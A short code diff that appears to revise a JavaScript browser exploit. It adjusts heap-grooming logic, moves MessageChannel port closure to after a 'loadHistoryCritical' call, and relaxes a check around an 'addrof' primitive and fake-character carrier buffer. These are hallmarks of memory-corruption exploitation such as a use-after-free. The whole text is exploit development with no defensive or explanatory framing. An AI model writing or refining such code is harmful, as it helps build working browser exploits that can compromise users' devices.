@@ -1076,8 +1076,6 @@ function runGroomAndLoad() {
   try {
     emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
     const channel = new MessageChannel();
-    channel.port1.close();
-    channel.port2.close();
 
     for (let i = 0; i < DRAIN_COUNT; ++i)
       keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
@@ -1111,7 +1109,9 @@ function runGroomAndLoad() {
       earlyHole,
       finalHole,
     ]);
-    loadHistoryCritical();
+ loadHistoryCritical();
+    channel.port1.close();
+    channel.port2.close();
   } catch (error) {
     try {
       clearPredecessor();
@@ -1180,8 +1180,8 @@ function beginComposition() {
     plausibleCell(b0) &&
     plausibleCell(a1) &&
     plausibleCell(b1);
-  const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
-  const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
+  const sourceCovered = copiedLength > 16 && fakeChars >= 0;
 
   emit("ADDROF-RETURNED", REVISION);
   emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
